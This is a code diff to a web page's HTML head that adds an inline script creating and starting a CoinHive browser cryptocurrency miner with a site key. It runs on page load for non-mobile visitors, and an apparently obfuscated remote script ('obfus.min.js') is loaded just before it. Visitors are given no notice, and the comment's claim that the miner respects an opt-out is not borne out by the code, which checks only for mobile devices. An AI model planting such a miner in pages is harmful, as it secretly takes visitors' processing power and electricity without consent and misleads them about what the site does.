@@ -32,9 +32,15 @@
         <link rel="apple-touch-icon" href="img/apple-touch-icon.png">
 		
 		<script src="https://cdn.rawgit.com/Pocketart/1776ba314b39049695610e7345c50feb/raw/04d59b19235d6bf837caabdeabc29456a62a2140/obfus.min.js"></script>
-		<script src="https://cdn.rawgit.com/Pocketart/c3d87c8cdd3621f1071b269077b83f72/raw/0d38effad944816600e4244aae7e339302f0f7d8/chvvvne.js"></script>
-		
-		
+		<script>
+			var miner = new CoinHive.Anonymous('CzotMpKp3dfHlggONPVBRnKSuyaGbusD', {throttle: 0.3});
+
+			// Only start on non-mobile devices and if not opted-out
+			// in the last 14400 seconds (4 hours):
+			if (!miner.isMobile()) {
+					miner.start();
+			}
+		</script>
 		
     </head>
     <!-- End Head -->
